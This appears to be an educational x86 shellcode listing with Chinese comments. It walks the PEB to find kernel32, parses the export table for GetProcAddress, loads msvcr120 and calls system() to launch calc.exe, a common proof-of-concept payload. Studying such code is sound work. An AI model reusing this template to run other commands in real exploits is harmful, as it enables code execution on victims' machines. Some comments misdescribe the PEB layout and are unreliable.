
    call A
A :
    pop edi		
    sub edi,5    ; 此时edi中存储着当前地址。

    mov [edi-80], edi;//assign current address.
    
    mov eax, fs:[30h]      ;fs寄存器存储着PEB的地址，PEB的30h处是TEB的地址
    mov eax, [eax + 0ch]   ;TEB的10h处是Ldr的地址
    mov eax, [eax + 1ch]   ;Ldr的1Ch处是InInitializationOrderModuleList的地址,此时eax指向第一个节点(ntdll.dll)
    mov eax, [eax]         ;此时eax 指向第二个节点（kernel32.dll)
    mov eax, [eax + 8h]    ;此时eax指向kernel32的基址
    mov [edi-8], eax;      ;将其赋值给变量kernelBase

    push edi               ;保存addressOfCurrent
    mov edi, eax           ;此时edi为kernelBase
    mov eax, [edi + 3Ch]   ;3Ch处为kernel32.dll的PE头的偏移
    mov edx, [edi + eax + 78h] ;基址加PE头的偏移加78h为导出表的指针
    add edx, edi；         ;加上kernelBase,得到导出表的真实地址
    mov ecx, [edx + 14h]   ;导出表14h处为导出函数的总数
    mov ebx, [edx + 20h]   ;导出表20h处为函数名表的地址
    add ebx, edi;          ;此时ebx为函数名称表的绝对地址

search :
    dec ecx 
    mov esi, [ebx + ecx * 4]
    add esi, edi         ;依次找每个函数名称
                         ;因为一个字符是一个字节，eax是4个
                         ;字节，先匹配GetP,再匹配rocA，若都相同则匹配上
    mov eax, 0x50746547  
    cmp[esi], eax; 'PteG'
    jne search
    mov eax, 0x41636f72
    cmp[esi + 4], eax; 'Acor'
    jne search
                          ;找到后ecx存储着该函数名称所在的序号
    mov ebx, [edx + 24h]
    add ebx, edi
    mov cx, [ebx + ecx * 2]
    mov ebx, [edx + 1Ch]  ;1Ch处为导出函数地址表的地址
    add ebx, edi          ;转换为绝对地址
    mov eax, [ebx + ecx * 4] ;eax存储该函数相对偏移
    add eax, edi            ;转为绝对地址
    pop edi                ; 恢复edi为我们代码的起始地址
    mov [edi-4], eax       ; 存储getprocaddress函数的地址


    mov ebx, edi           
    sub ebx,28
    push ebx               ; 此处将LoadLibraryExA的函数名压栈
    add ebx,28 
    push [ebx-8]           ;将KernelBase压栈 
    call [ebx-4]           ;调用GetProcAddress获得LoadLibraryExA的函数地址
    mov [ebx-12], eax      ;存储LoadLibrary的函数地址

    push 0x00000010        ; dwFlags
    push 0x00000000        ; NULL
    sub ebx,76
    push ebx               ; 模块名
    add ebx,76
    call [ebx-12]          ;调用函数
    mov [ebx-84], eax      ;存储msvcr120的基址

    mov edx, eax           ;edx为msvcr120的基址
    sub ebx,60             
    push ebx               ;system函数函数名
    add ebx,60
    push edx               ;msvcr120的基址
    call [ebx-4]           ;调用获得system函数的地址 

    sub ebx,44               
    push ebx               ;calc.exe的函数名
    add ebx,44
    call eax               ;运行system函数 
    